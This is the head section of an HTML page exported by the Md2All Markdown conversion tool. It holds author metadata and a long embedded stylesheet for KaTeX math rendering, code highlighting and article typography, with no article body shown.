<!DOCTYPE html>
<html>
<head>  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,height=device-height,initial-scale=1,user-scalable=0">
  <meta name="author" content="微信公众号：颜家大少">
  <meta name="email" content="3056432@qq.com">
  <meta name="description" content="一个Markdown在线转换工具，让Markdown内容，不需作任何调整就能同时在微信公众号、博客园、掘金、csdn等平台正确显示当前预览的效果">
  <title>Md2All export document</title>  
  <style type="text/css" id="markdown_preview_css"> 
 .output_wrapper pre code{font-family: Consolas, Inconsolata, Courier, monospace; display: block !important; white-space: pre !important; word-wrap: normal !important; word-break: normal !important;  overflow: auto !important;}  
.output_wrapper a:hover { text-decoration: underline; color: rgb(0, 96, 100); }
.output_wrapper figcaption { margin-top: 10px; text-align: center; color: rgb(153, 153, 153); font-size: 0.7em; }
.output_wrapper pre code .linenum { padding-right: 20px; word-spacing: 0px; }
.task-list-list { list-style-type: none; }
.task-list-list.checked { color: rgb(62, 62, 62); }
.task-list-list.uncheck { color: rgb(191, 193, 191); }
.task-list-list .icon_uncheck, .task-list-list .icon_check { display: inline-block; vertical-align: middle; margin-right: 10px; }
.task-list-list .icon_check::before { content: "√"; border: 2px solid rgb(62, 62, 62); color: red; }
.task-list-list .icon_uncheck::before { content: "x"; border: 2px solid rgb(191, 193, 191); color: rgb(191, 193, 191); }
.task-list-list .icon_check::before, .task-list-list .icon_uncheck::before { padding: 2px 8px 2px 5px; border-radius: 5px; }
@font-face { font-family: KaTeX_AMS; src: url("fonts/KaTeX_AMS-Regular.woff2") format("woff2"), url("fonts/KaTeX_AMS-Regular.woff") format("woff"), url("fonts/KaTeX_AMS-Regular.ttf") format("truetype"); font-weight: normal; font-style: normal; }
@font-face { font-family: KaTeX_Caligraphic; src: url("fonts/KaTeX_Caligraphic-Bold.woff2") format("woff2"), url("fonts/KaTeX_Caligraphic-Bold.woff") format("woff"), url("fonts/KaTeX_Caligraphic-Bold.ttf") format("truetype"); font-weight: bold; font-style: normal; }
@font-face { font-family: KaTeX_Caligraphic; src: url("fonts/KaTeX_Caligraphic-Regular.woff2") format("woff2"), url("fonts/KaTeX_Caligraphic-Regular.woff") format("woff"), url("fonts/KaTeX_Caligraphic-Regular.ttf") format("truetype"); font-weight: normal; font-style: normal; }
@font-face { font-family: KaTeX_Fraktur; src: url("fonts/KaTeX_Fraktur-Bold.woff2") format("woff2"), url("fonts/KaTeX_Fraktur-Bold.woff") format("woff"), url("fonts/KaTeX_Fraktur-Bold.ttf") format("truetype"); font-weight: bold; font-style: normal; }
@font-face { font-family: KaTeX_Fraktur; src: url("fonts/KaTeX_Fraktur-Regular.woff2") format("woff2"), url("fonts/KaTeX_Fraktur-Regular.woff") format("woff"), url("fonts/KaTeX_Fraktur-Regular.ttf") format("truetype"); font-weight: normal; font-style: normal; }
@font-face { font-family: KaTeX_Main; src: url("fonts/KaTeX_Main-Bold.woff2") format("woff2"), url("fonts/KaTeX_Main-Bold.woff") format("woff"), url("fonts/KaTeX_Main-Bold.ttf") format("truetype"); font-weight: bold; font-style: normal; }
@font-face { font-family: KaTeX_Main; src: url("fonts/KaTeX_Main-BoldItalic.woff2") format("woff2"), url("fonts/KaTeX_Main-BoldItalic.woff") format("woff"), url("fonts/KaTeX_Main-BoldItalic.ttf") format("truetype"); font-weight: bold; font-style: italic; }
@font-face { font-family: KaTeX_Main; src: url("fonts/KaTeX_Main-Italic.woff2") format("woff2"), url("fonts/KaTeX_Main-Italic.woff") format("woff"), url("fonts/KaTeX_Main-Italic.ttf") format("truetype"); font-weight: normal; font-style: italic; }
@font-face { font-family: KaTeX_Main; src: url("fonts/KaTeX_Main-Regular.woff2") format("woff2"), url("fonts/KaTeX_Main-Regular.woff") format("woff"), url("fonts/KaTeX_Main-Regular.ttf") format("truetype"); font-weight: normal; font-style: normal; }
@font-face { font-family: KaTeX_Math; src: url("fonts/KaTeX_Math-BoldItalic.woff2") format("woff2"), url("fonts/KaTeX_Math-BoldItalic.woff") format("woff"), url("fonts/KaTeX_Math-BoldItalic.ttf") format("truetype"); font-weight: bold; font-style: italic; }
@font-face { font-family: KaTeX_Math; src: url("fonts/KaTeX_Math-Italic.woff2") format("woff2"), url("fonts/KaTeX_Math-Italic.woff") format("woff"), url("fonts/KaTeX_Math-Italic.ttf") format("truetype"); font-weight: normal; font-style: italic; }
@font-face { font-family: KaTeX_SansSerif; src: url("fonts/KaTeX_SansSerif-Bold.woff2") format("woff2"), url("fonts/KaTeX_SansSerif-Bold.woff") format("woff"), url("fonts/KaTeX_SansSerif-Bold.ttf") format("truetype"); font-weight: bold; font-style: normal; }
@font-face { font-family: KaTeX_SansSerif; src: url("fonts/KaTeX_SansSerif-Italic.woff2") format("woff2"), url("fonts/KaTeX_SansSerif-Italic.woff") format("woff"), url("fonts/KaTeX_SansSerif-Italic.ttf") format("truetype"); font-weight: normal; font-style: italic; }
@font-face { font-family: KaTeX_SansSerif; src: url("fonts/KaTeX_SansSerif-Regular.woff2") format("woff2"), url("fonts/KaTeX_SansSerif-Regular.woff") format("woff"), url("fonts/KaTeX_SansSerif-Regular.ttf") format("truetype"); font-weight: normal; font-style: normal; }
@font-face { font-family: KaTeX_Script; src: url("fonts/KaTeX_Script-Regular.woff2") format("woff2"), url("fonts/KaTeX_Script-Regular.woff") format("woff"), url("fonts/KaTeX_Script-Regular.ttf") format("truetype"); font-weight: normal; font-style: normal; }
@font-face { font-family: KaTeX_Size1; src: url("fonts/KaTeX_Size1-Regular.woff2") format("woff2"), url("fonts/KaTeX_Size1-Regular.woff") format("woff"), url("fonts/KaTeX_Size1-Regular.ttf") format("truetype"); font-weight: normal; font-style: normal; }
@font-face { font-family: KaTeX_Size2; src: url("fonts/KaTeX_Size2-Regular.woff2") format("woff2"), url("fonts/KaTeX_Size2-Regular.woff") format("woff"), url("fonts/KaTeX_Size2-Regular.ttf") format("truetype"); font-weight: normal; font-style: normal; }
@font-face { font-family: KaTeX_Size3; src: url("fonts/KaTeX_Size3-Regular.woff2") format("woff2"), url("fonts/KaTeX_Size3-Regular.woff") format("woff"), url("fonts/KaTeX_Size3-Regular.ttf") format("truetype"); font-weight: normal; font-style: normal; }
@font-face { font-family: KaTeX_Size4; src: url("fonts/KaTeX_Size4-Regular.woff2") format("woff2"), url("fonts/KaTeX_Size4-Regular.woff") format("woff"), url("fonts/KaTeX_Size4-Regular.ttf") format("truetype"); font-weight: normal; font-style: normal; }
@font-face { font-family: KaTeX_Typewriter; src: url("fonts/KaTeX_Typewriter-Regular.woff2") format("woff2"), url("fonts/KaTeX_Typewriter-Regular.woff") format("woff"), url("fonts/KaTeX_Typewriter-Regular.ttf") format("truetype"); font-weight: normal; font-style: normal; }
@media screen {
  .katex .mtable .vertical-separator { min-width: 1px; }
  .katex .mfrac .frac-line, .katex .overline .overline-line, .katex .underline .underline-line, .katex .hline, .katex .hdashline, .katex .rule { min-height: 1px; }
}
.katex-display { display: block; margin: 1em 0px; text-align: center; }
.katex-display > .katex { display: block; text-align: center; white-space: nowrap; }
.katex-display > .katex > .katex-html { display: block; }
.katex-display > .katex > .katex-html > .tag { position: absolute; right: 0px; }
.katex { font: 1.21em / 1.2 KaTeX_Main, "Times New Roman", serif; text-indent: 0px; text-rendering: auto; }
.katex * { }
.katex .katex-mathml { position: absolute; clip: rect(1px, 1px, 1px, 1px); padding: 0px; border: 0px; height: 1px; width: 1px; overflow: hidden; }
.katex .katex-html { }
.katex .katex-html > .newline { display: block; }
.katex .base { position: relative; display: inline-block; white-space: nowrap; width: min-content; }
.katex .strut { display: inline-block; }
.katex .textbf { font-weight: bold; }
.katex .textit { font-style: italic; }
.katex .textrm { font-family: KaTeX_Main; }
.katex .textsf { font-family: KaTeX_SansSerif; }
.katex .texttt { font-family: KaTeX_Typewriter; }
.katex .mathit { font-family: KaTeX_Math; font-style: italic; }
.katex .mathrm { font-style: normal; }
.katex .mathbf { font-family: KaTeX_Main; font-weight: bold; }
.katex .boldsymbol { font-family: KaTeX_Math; font-weight: bold; font-style: italic; }
.katex .amsrm { font-family: KaTeX_AMS; }
.katex .mathbb, .katex .textbb { font-family: KaTeX_AMS; }
.katex .mathcal { font-family: KaTeX_Caligraphic; }
.katex .mathfrak, .katex .textfrak { font-family: KaTeX_Fraktur; }
.katex .mathtt { font-family: KaTeX_Typewriter; }
.katex .mathscr, .katex .textscr { font-family: KaTeX_Script; }
.katex .mathsf, .katex .textsf { font-family: KaTeX_SansSerif; }
.katex .mainit { font-family: KaTeX_Main; font-style: italic; }
.katex .mainrm { font-family: KaTeX_Main; font-style: normal; }
.katex .vlist-t { display: inline-table; table-layout: fixed; }
.katex .vlist-r { display: table-row; }
.katex .vlist { display: table-cell; vertical-align: bottom; position: relative; }
.katex .vlist > span { display: block; height: 0px; position: relative; }
.katex .vlist > span > span { display: inline-block; }
.katex .vlist > span > .pstrut { overflow: hidden; width: 0px; }
.katex .vlist-t2 { margin-right: -2px; }
.katex .vlist-s { display: table-cell; vertical-align: bottom; font-size: 1px; width: 2px; min-width: 2px; }
.katex .msupsub { text-align: left; }
.katex .mfrac > span > span { text-align: center; }
.katex .mfrac .frac-line { display: inline-block; width: 100%; border-bottom-style: solid; }
.katex .mspace { display: inline-block; }
.katex .llap, .katex .rlap, .katex .clap { width: 0px; position: relative; }
.katex .llap > .inner, .katex .rlap > .inner, .katex .clap > .inner { position: absolute; }
.katex .llap > .fix, .katex .rlap > .fix, .katex .clap > .fix { display: inline-block; }
.katex .llap > .inner { right: 0px; }
.katex .rlap > .inner, .katex .clap > .inner { left: 0px; }
.katex .clap > .inner > span { margin-left: -50%; margin-right: 50%; }
.katex .rule { display: inline-block; border: 0px solid; position: relative; }
.katex .overline .overline-line, .katex .underline .underline-line, .katex .hline { display: inline-block; width: 100%; border-bottom-style: solid; }
.katex .hdashline { display: inline-block; width: 100%; border-bottom-style: dashed; }
.katex .sqrt > .root { margin-left: 0.277778em; margin-right: -0.555556em; }
.katex .sizing, .katex .fontsize-ensurer { display: inline-block; }
.katex .sizing.reset-size1.size1, .katex .fontsize-ensurer.reset-size1.size1 { font-size: 1em; }
.katex .sizing.reset-size1.size2, .katex .fontsize-ensurer.reset-size1.size2 { font-size: 1.2em; }
.katex .sizing.reset-size1.size3, .katex .fontsize-ensurer.reset-size1.size3 { font-size: 1.4em; }
.katex .sizing.reset-size1.size4, .katex .fontsize-ensurer.reset-size1.size4 { font-size: 1.6em; }
.katex .sizing.reset-size1.size5, .katex .fontsize-ensurer.reset-size1.size5 { font-size: 1.8em; }
.katex .sizing.reset-size1.size6, .katex .fontsize-ensurer.reset-size1.size6 { font-size: 2em; }
.katex .sizing.reset-size1.size7, .katex .fontsize-ensurer.reset-size1.size7 { font-size: 2.4em; }
.katex .sizing.reset-size1.size8, .katex .fontsize-ensurer.reset-size1.size8 { font-size: 2.88em; }
.katex .sizing.reset-size1.size9, .katex .fontsize-ensurer.reset-size1.size9 { font-size: 3.456em; }
.katex .sizing.reset-size1.size10, .katex .fontsize-ensurer.reset-size1.size10 { font-size: 4.148em; }
.katex .sizing.reset-size1.size11, .katex .fontsize-ensurer.reset-size1.size11 { font-size: 4.976em; }
.katex .sizing.reset-size2.size1, .katex .fontsize-ensurer.reset-size2.size1 { font-size: 0.833333em; }
.katex .sizing.reset-size2.size2, .katex .fontsize-ensurer.reset-size2.size2 { font-size: 1em; }
.katex .sizing.reset-size2.size3, .katex .fontsize-ensurer.reset-size2.size3 { font-size: 1.16667em; }
.katex .sizing.reset-size2.size4, .katex .fontsize-ensurer.reset-size2.size4 { font-size: 1.33333em; }
.katex .sizing.reset-size2.size5, .katex .fontsize-ensurer.reset-size2.size5 { font-size: 1.5em; }
.katex .sizing.reset-size2.size6, .katex .fontsize-ensurer.reset-size2.size6 { font-size: 1.66667em; }
.katex .sizing.reset-size2.size7, .katex .fontsize-ensurer.reset-size2.size7 { font-size: 2em; }
.katex .sizing.reset-size2.size8, .katex .fontsize-ensurer.reset-size2.size8 { font-size: 2.4em; }
.katex .sizing.reset-size2.size9, .katex .fontsize-ensurer.reset-size2.size9 { font-size: 2.88em; }
.katex .sizing.reset-size2.size10, .katex .fontsize-ensurer.reset-size2.size10 { font-size: 3.45667em; }
.katex .sizing.reset-size2.size11, .katex .fontsize-ensurer.reset-size2.size11 { font-size: 4.14667em; }
.katex .sizing.reset-size3.size1, .katex .fontsize-ensurer.reset-size3.size1 { font-size: 0.714286em; }
.katex .sizing.reset-size3.size2, .katex .fontsize-ensurer.reset-size3.size2 { font-size: 0.857143em; }
.katex .sizing.reset-size3.size3, .katex .fontsize-ensurer.reset-size3.size3 { font-size: 1em; }
.katex .sizing.reset-size3.size4, .katex .fontsize-ensurer.reset-size3.size4 { font-size: 1.14286em; }
.katex .sizing.reset-size3.size5, .katex .fontsize-ensurer.reset-size3.size5 { font-size: 1.28571em; }
.katex .sizing.reset-size3.size6, .katex .fontsize-ensurer.reset-size3.size6 { font-size: 1.42857em; }
.katex .sizing.reset-size3.size7, .katex .fontsize-ensurer.reset-size3.size7 { font-size: 1.71429em; }
.katex .sizing.reset-size3.size8, .katex .fontsize-ensurer.reset-size3.size8 { font-size: 2.05714em; }
.katex .sizing.reset-size3.size9, .katex .fontsize-ensurer.reset-size3.size9 { font-size: 2.46857em; }
.katex .sizing.reset-size3.size10, .katex .fontsize-ensurer.reset-size3.size10 { font-size: 2.96286em; }
.katex .sizing.reset-size3.size11, .katex .fontsize-ensurer.reset-size3.size11 { font-size: 3.55429em; }
.katex .sizing.reset-size4.size1, .katex .fontsize-ensurer.reset-size4.size1 { font-size: 0.625em; }
.katex .sizing.reset-size4.size2, .katex .fontsize-ensurer.reset-size4.size2 { font-size: 0.75em; }
.katex .sizing.reset-size4.size3, .katex .fontsize-ensurer.reset-size4.size3 { font-size: 0.875em; }
.katex .sizing.reset-size4.size4, .katex .fontsize-ensurer.reset-size4.size4 { font-size: 1em; }
.katex .sizing.reset-size4.size5, .katex .fontsize-ensurer.reset-size4.size5 { font-size: 1.125em; }
.katex .sizing.reset-size4.size6, .katex .fontsize-ensurer.reset-size4.size6 { font-size: 1.25em; }
.katex .sizing.reset-size4.size7, .katex .fontsize-ensurer.reset-size4.size7 { font-size: 1.5em; }
.katex .sizing.reset-size4.size8, .katex .fontsize-ensurer.reset-size4.size8 { font-size: 1.8em; }
.katex .sizing.reset-size4.size9, .katex .fontsize-ensurer.reset-size4.size9 { font-size: 2.16em; }
.katex .sizing.reset-size4.size10, .katex .fontsize-ensurer.reset-size4.size10 { font-size: 2.5925em; }
.katex .sizing.reset-size4.size11, .katex .fontsize-ensurer.reset-size4.size11 { font-size: 3.11em; }
.katex .sizing.reset-size5.size1, .katex .fontsize-ensurer.reset-size5.size1 { font-size: 0.555556em; }
.katex .sizing.reset-size5.size2, .katex .fontsize-ensurer.reset-size5.size2 { font-size: 0.666667em; }
.katex .sizing.reset-size5.size3, .katex .fontsize-ensurer.reset-size5.size3 { font-size: 0.777778em; }
.katex .sizing.reset-size5.size4, .katex .fontsize-ensurer.reset-size5.size4 { font-size: 0.888889em; }
.katex .sizing.reset-size5.size5, .katex .fontsize-ensurer.reset-size5.size5 { font-size: 1em; }
.katex .sizing.reset-size5.size6, .katex .fontsize-ensurer.reset-size5.size6 { font-size: 1.11111em; }
.katex .sizing.reset-size5.size7, .katex .fontsize-ensurer.reset-size5.size7 { font-size: 1.33333em; }
.katex .sizing.reset-size5.size8, .katex .fontsize-ensurer.reset-size5.size8 { font-size: 1.6em; }
.katex .sizing.reset-size5.size9, .katex .fontsize-ensurer.reset-size5.size9 { font-size: 1.92em; }
.katex .sizing.reset-size5.size10, .katex .fontsize-ensurer.reset-size5.size10 { font-size: 2.30444em; }
.katex .sizing.reset-size5.size11, .katex .fontsize-ensurer.reset-size5.size11 { font-size: 2.76444em; }
.katex .sizing.reset-size6.size1, .katex .fontsize-ensurer.reset-size6.size1 { font-size: 0.5em; }
.katex .sizing.reset-size6.size2, .katex .fontsize-ensurer.reset-size6.size2 { font-size: 0.6em; }
.katex .sizing.reset-size6.size3, .katex .fontsize-ensurer.reset-size6.size3 { font-size: 0.7em; }
.katex .sizing.reset-size6.size4, .katex .fontsize-ensurer.reset-size6.size4 { font-size: 0.8em; }
.katex .sizing.reset-size6.size5, .katex .fontsize-ensurer.reset-size6.size5 { font-size: 0.9em; }
.katex .sizing.reset-size6.size6, .katex .fontsize-ensurer.reset-size6.size6 { font-size: 1em; }
.katex .sizing.reset-size6.size7, .katex .fontsize-ensurer.reset-size6.size7 { font-size: 1.2em; }
.katex .sizing.reset-size6.size8, .katex .fontsize-ensurer.reset-size6.size8 { font-size: 1.44em; }
.katex .sizing.reset-size6.size9, .katex .fontsize-ensurer.reset-size6.size9 { font-size: 1.728em; }
.katex .sizing.reset-size6.size10, .katex .fontsize-ensurer.reset-size6.size10 { font-size: 2.074em; }
.katex .sizing.reset-size6.size11, .katex .fontsize-ensurer.reset-size6.size11 { font-size: 2.488em; }
.katex .sizing.reset-size7.size1, .katex .fontsize-ensurer.reset-size7.size1 { font-size: 0.416667em; }
.katex .sizing.reset-size7.size2, .katex .fontsize-ensurer.reset-size7.size2 { font-size: 0.5em; }
.katex .sizing.reset-size7.size3, .katex .fontsize-ensurer.reset-size7.size3 { font-size: 0.583333em; }
.katex .sizing.reset-size7.size4, .katex .fontsize-ensurer.reset-size7.size4 { font-size: 0.666667em; }
.katex .sizing.reset-size7.size5, .katex .fontsize-ensurer.reset-size7.size5 { font-size: 0.75em; }
.katex .sizing.reset-size7.size6, .katex .fontsize-ensurer.reset-size7.size6 { font-size: 0.833333em; }
.katex .sizing.reset-size7.size7, .katex .fontsize-ensurer.reset-size7.size7 { font-size: 1em; }
.katex .sizing.reset-size7.size8, .katex .fontsize-ensurer.reset-size7.size8 { font-size: 1.2em; }
.katex .sizing.reset-size7.size9, .katex .fontsize-ensurer.reset-size7.size9 { font-size: 1.44em; }
.katex .sizing.reset-size7.size10, .katex .fontsize-ensurer.reset-size7.size10 { font-size: 1.72833em; }
.katex .sizing.reset-size7.size11, .katex .fontsize-ensurer.reset-size7.size11 { font-size: 2.07333em; }
.katex .sizing.reset-size8.size1, .katex .fontsize-ensurer.reset-size8.size1 { font-size: 0.347222em; }
.katex .sizing.reset-size8.size2, .katex .fontsize-ensurer.reset-size8.size2 { font-size: 0.416667em; }
.katex .sizing.reset-size8.size3, .katex .fontsize-ensurer.reset-size8.size3 { font-size: 0.486111em; }
.katex .sizing.reset-size8.size4, .katex .fontsize-ensurer.reset-size8.size4 { font-size: 0.555556em; }
.katex .sizing.reset-size8.size5, .katex .fontsize-ensurer.reset-size8.size5 { font-size: 0.625em; }
.katex .sizing.reset-size8.size6, .katex .fontsize-ensurer.reset-size8.size6 { font-size: 0.694444em; }
.katex .sizing.reset-size8.size7, .katex .fontsize-ensurer.reset-size8.size7 { font-size: 0.833333em; }
.katex .sizing.reset-size8.size8, .katex .fontsize-ensurer.reset-size8.size8 { font-size: 1em; }
.katex .sizing.reset-size8.size9, .katex .fontsize-ensurer.reset-size8.size9 { font-size: 1.2em; }
.katex .sizing.reset-size8.size10, .katex .fontsize-ensurer.reset-size8.size10 { font-size: 1.44028em; }
.katex .sizing.reset-size8.size11, .katex .fontsize-ensurer.reset-size8.size11 { font-size: 1.72778em; }
.katex .sizing.reset-size9.size1, .katex .fontsize-ensurer.reset-size9.size1 { font-size: 0.289352em; }
.katex .sizing.reset-size9.size2, .katex .fontsize-ensurer.reset-size9.size2 { font-size: 0.347222em; }
.katex .sizing.reset-size9.size3, .katex .fontsize-ensurer.reset-size9.size3 { font-size: 0.405093em; }
.katex .sizing.reset-size9.size4, .katex .fontsize-ensurer.reset-size9.size4 { font-size: 0.462963em; }
.katex .sizing.reset-size9.size5, .katex .fontsize-ensurer.reset-size9.size5 { font-size: 0.520833em; }
.katex .sizing.reset-size9.size6, .katex .fontsize-ensurer.reset-size9.size6 { font-size: 0.578704em; }
.katex .sizing.reset-size9.size7, .katex .fontsize-ensurer.reset-size9.size7 { font-size: 0.694444em; }
.katex .sizing.reset-size9.size8, .katex .fontsize-ensurer.reset-size9.size8 { font-size: 0.833333em; }
.katex .sizing.reset-size9.size9, .katex .fontsize-ensurer.reset-size9.size9 { font-size: 1em; }
.katex .sizing.reset-size9.size10, .katex .fontsize-ensurer.reset-size9.size10 { font-size: 1.20023em; }
.katex .sizing.reset-size9.size11, .katex .fontsize-ensurer.reset-size9.size11 { font-size: 1.43981em; }
.katex .sizing.reset-size10.size1, .katex .fontsize-ensurer.reset-size10.size1 { font-size: 0.24108em; }
.katex .sizing.reset-size10.size2, .katex .fontsize-ensurer.reset-size10.size2 { font-size: 0.289296em; }
.katex .sizing.reset-size10.size3, .katex .fontsize-ensurer.reset-size10.size3 { font-size: 0.337512em; }
.katex .sizing.reset-size10.size4, .katex .fontsize-ensurer.reset-size10.size4 { font-size: 0.385728em; }
.katex .sizing.reset-size10.size5, .katex .fontsize-ensurer.reset-size10.size5 { font-size: 0.433944em; }
.katex .sizing.reset-size10.size6, .katex .fontsize-ensurer.reset-size10.size6 { font-size: 0.48216em; }
.katex .sizing.reset-size10.size7, .katex .fontsize-ensurer.reset-size10.size7 { font-size: 0.578592em; }
.katex .sizing.reset-size10.size8, .katex .fontsize-ensurer.reset-size10.size8 { font-size: 0.694311em; }
.katex .sizing.reset-size10.size9, .katex .fontsize-ensurer.reset-size10.size9 { font-size: 0.833173em; }
.katex .sizing.reset-size10.size10, .katex .fontsize-ensurer.reset-size10.size10 { font-size: 1em; }
.katex .sizing.reset-size10.size11, .katex .fontsize-ensurer.reset-size10.size11 { font-size: 1.19961em; }
.katex .sizing.reset-size11.size1, .katex .fontsize-ensurer.reset-size11.size1 { font-size: 0.200965em; }
.katex .sizing.reset-size11.size2, .katex .fontsize-ensurer.reset-size11.size2 { font-size: 0.241158em; }
.katex .sizing.reset-size11.size3, .katex .fontsize-ensurer.reset-size11.size3 { font-size: 0.28135em; }
.katex .sizing.reset-size11.size4, .katex .fontsize-ensurer.reset-size11.size4 { font-size: 0.321543em; }
.katex .sizing.reset-size11.size5, .katex .fontsize-ensurer.reset-size11.size5 { font-size: 0.361736em; }
.katex .sizing.reset-size11.size6, .katex .fontsize-ensurer.reset-size11.size6 { font-size: 0.401929em; }
.katex .sizing.reset-size11.size7, .katex .fontsize-ensurer.reset-size11.size7 { font-size: 0.482315em; }
.katex .sizing.reset-size11.size8, .katex .fontsize-ensurer.reset-size11.size8 { font-size: 0.578778em; }
.katex .sizing.reset-size11.size9, .katex .fontsize-ensurer.reset-size11.size9 { font-size: 0.694534em; }
.katex .sizing.reset-size11.size10, .katex .fontsize-ensurer.reset-size11.size10 { font-size: 0.833601em; }
.katex .sizing.reset-size11.size11, .katex .fontsize-ensurer.reset-size11.size11 { font-size: 1em; }
.katex .delimsizing.size1 { font-family: KaTeX_Size1; }
.katex .delimsizing.size2 { font-family: KaTeX_Size2; }
.katex .delimsizing.size3 { font-family: KaTeX_Size3; }
.katex .delimsizing.size4 { font-family: KaTeX_Size4; }
.katex .delimsizing.mult .delim-size1 > span { font-family: KaTeX_Size1; }
.katex .delimsizing.mult .delim-size4 > span { font-family: KaTeX_Size4; }
.katex .nulldelimiter { display: inline-block; width: 0.12em; }
.katex .delimcenter { position: relative; }
.katex .op-symbol { position: relative; }
.katex .op-symbol.small-op { font-family: KaTeX_Size1; }
.katex .op-symbol.large-op { font-family: KaTeX_Size2; }
.katex .op-limits > .vlist-t { text-align: center; }
.katex .accent > .vlist-t { text-align: center; }
.katex .accent .accent-body:not(.accent-full) { width: 0px; }
.katex .accent .accent-body { position: relative; }
.katex .overlay { display: block; }
.katex .mtable .vertical-separator { display: inline-block; margin: 0px -0.025em; border-right: 0.05em solid; }
.katex .mtable .vs-dashed { border-right: 0.05em dashed; }
.katex .mtable .arraycolsep { display: inline-block; }
.katex .mtable .col-align-c > .vlist-t { text-align: center; }
.katex .mtable .col-align-l > .vlist-t { text-align: left; }
.katex .mtable .col-align-r > .vlist-t { text-align: right; }
.katex .svg-align { text-align: left; }
.katex svg, .screenShotTempCanvas { display: block; position: absolute; width: 100%; height: inherit; fill: currentcolor; stroke: currentcolor; fill-rule: nonzero; fill-opacity: 1; stroke-width: 1; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 4; stroke-dasharray: none; stroke-dashoffset: 0; stroke-opacity: 1; }
.katex svg path { stroke: none; }
.katex .stretchy { width: 100%; display: block; position: relative; overflow: hidden; }
.katex .stretchy::before, .katex .stretchy::after { content: ""; }
.katex .hide-tail { width: 100%; position: relative; overflow: hidden; }
.katex .halfarrow-left { position: absolute; left: 0px; width: 50.2%; overflow: hidden; }
.katex .halfarrow-right { position: absolute; right: 0px; width: 50.2%; overflow: hidden; }
.katex .brace-left { position: absolute; left: 0px; width: 25.1%; overflow: hidden; }
.katex .brace-center { position: absolute; left: 25%; width: 50%; overflow: hidden; }
.katex .brace-right { position: absolute; right: 0px; width: 25.1%; overflow: hidden; }
.katex .x-arrow-pad { padding: 0px 0.5em; }
.katex .x-arrow, .katex .mover, .katex .munder { text-align: center; }
.katex .boxpad { padding: 0px 0.3em; }
.katex .fbox { box-sizing: border-box; border: 0.04em solid black; }
.katex .fcolorbox { box-sizing: border-box; border: 0.04em solid; }
.katex .cancel-pad { padding: 0px 0.2em; }
.katex .cancel-lap { margin-left: -0.2em; margin-right: -0.2em; }
.katex .sout { border-bottom-style: solid; border-bottom-width: 0.08em; }
.output_wrapper pre code { display: -webkit-box !important; } 
.output_wrapper .hljs{color: rgb(169, 183, 198); background: rgb(40, 43, 46); display: block; overflow-x: auto; padding: 0.5em;}

.output_wrapper .hljs-params{color: rgb(255, 152, 35);}

.output_wrapper .hljs-number,.output_wrapper  .hljs-literal,.output_wrapper  .hljs-symbol,.output_wrapper  .hljs-bullet{color: rgb(174, 135, 250);}

.output_wrapper .hljs-function,.output_wrapper  .hljs-built_in,.output_wrapper  .hljs-name,.output_wrapper  .hljs-keyword,.output_wrapper  .hljs-selector-tag,.output_wrapper  .hljs-deletion{color: rgb(248, 35, 117);}

.output_wrapper .hljs-variable,.output_wrapper  .hljs-template-variable,.output_wrapper  .hljs-link{color: rgb(98, 151, 85);}

.output_wrapper .hljs-comment,.output_wrapper  .hljs-quote{color: rgb(128, 128, 128);}

.output_wrapper .hljs-meta{color: rgb(91, 218, 237);}

.output_wrapper .hljs-string,.output_wrapper  .hljs-attribute,.output_wrapper  .hljs-addition{color: rgb(238, 220, 112);}

.output_wrapper .hljs-attr,.output_wrapper  .hljs-section,.output_wrapper  .hljs-title,.output_wrapper  .hljs-type{color: rgb(165, 218, 45);}

.output_wrapper .hljs-selector-class{color: rgb(165, 218, 45);}

.output_wrapper .hljs-emphasis{font-style: italic;}

.output_wrapper .hljs-strong{font-weight: bold;}
 
.output_wrapper pre code {line-height: 18px; font-size: 14px; font-weight: normal; word-spacing: 0px; letter-spacing: 0px;} 
.output_wrapper{font-size: 16px; color: rgb(62, 62, 62); line-height: 1.6; word-spacing: 0px; letter-spacing: 0px; font-family: "Helvetica Neue", Helvetica, "Hiragino Sans GB", "Microsoft YaHei", Arial, sans-serif; background-image: linear-gradient(90deg, rgba(50, 0, 0, 0.05) 3%, rgba(0, 0, 0, 0) 3%), linear-gradient(360deg, rgba(50, 0, 0, 0.05) 3%, rgba(0, 0, 0, 0) 3%); background-size: 20px 20px; background-position: center center;}

.output_wrapper *{font-size: inherit; color: inherit; line-height: inherit; margin: 0px; padding: 0px;}

.output_wrapper p{margin: 1.5em 0px;}

.output_wrapper h1,.output_wrapper  h2,.output_wrapper  h3,.output_wrapper  h4,.output_wrapper  h5,.output_wrapper  h6{margin: 1.5em 0px; font-weight: bold;}

.output_wrapper h1{font-size: 1.6em;}

.output_wrapper h2{font-size: 1.4em;}

.output_wrapper h3{font-size: 1.3em;}

.output_wrapper h4{font-size: 1.2em;}

.output_wrapper h5{font-size: 1em;}

.output_wrapper h6{font-size: 1em;}

.output_wrapper ul,.output_wrapper  ol{padding-left: 32px;}

.output_wrapper ul{list-style-type: disc;}

.output_wrapper ol{list-style-type: decimal;}

.output_wrapper li *{}

.output_wrapper li{margin-bottom: 0.5em;}

.output_wrapper .code_size_default{line-height: 18px; font-size: 14px; font-weight: normal; word-spacing: 0px; letter-spacing: 0px;}

.output_wrapper .code_size_tight{line-height: 15px; font-size: 11px; font-weight: normal; word-spacing: -3px; letter-spacing: 0px;}

.output_wrapper pre code{font-family: Consolas, Inconsolata, Courier, monospace; border-radius: 0px;}

.output_wrapper blockquote{display: block; padding: 15px 15px 15px 1rem; font-size: 0.9em; margin: 1em 0px; color: rgb(129, 145, 152); border-left: 6px solid rgb(220, 230, 240); background: rgb(242, 247, 251); overflow: auto; overflow-wrap: normal; word-break: normal;}

.output_wrapper blockquote p{margin: 0px;}

.output_wrapper a{text-decoration: none; color: rgb(30, 107, 184); overflow-wrap: break-word;}

.output_wrapper strong{font-weight: bold;}

.output_wrapper em{font-style: italic;}

.output_wrapper del{font-style: italic;}

.output_wrapper strong em{font-weight: bold;}

.output_wrapper hr{height: 1px; margin: 1.5rem 0px; border-right: none; border-bottom: none; border-left: none; border-image: initial; border-top: 1px dashed rgb(165, 165, 165);}

.output_wrapper code{overflow-wrap: break-word; padding: 2px 4px; border-radius: 4px; margin: 0px 2px; color: rgb(233, 105, 0); background: rgb(248, 248, 248);}

.output_wrapper img{display: block; margin: 0px auto; max-width: 100%;}

.output_wrapper figcaption{margin-top: 10px; text-align: center; color: rgb(153, 153, 153); font-size: 0.7em;}

.output_wrapper table{display: table; width: 100%; text-align: left;}

.output_wrapper tbody{border: 0px;}

